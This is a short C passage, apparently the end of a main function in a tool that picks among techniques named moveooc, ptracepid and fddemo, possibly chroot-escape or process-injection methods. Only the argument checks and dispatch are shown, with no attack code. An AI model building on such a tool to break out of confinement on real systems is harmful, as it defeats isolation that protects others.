                printf("[-] Missing argument: --dir or --tempdir\n\n");
            break;
        case 5:
            if (dir1_arg && dir2_arg && dir3_arg)
		return moveooc(dir1_arg, dir2_arg, dir3_arg);
            else
                printf("[-] Missing argument: --dir or --nestdir or --tempdir\n\n");
            break;
        case 6:
            return ptracepid(pid_arg, 0, port_arg);
            break;
        case 7:
            return ptracepid(pid_arg, 1, port_arg);
            break; 
        case 9:
            if (dir1_arg)
		return fddemo(dir1_arg);
            else
                printf("[-] Missing argument: --dir\n\n");
            break;
	default:
	    printf("[-] No method was chosen\n");
	    break;
    } 
}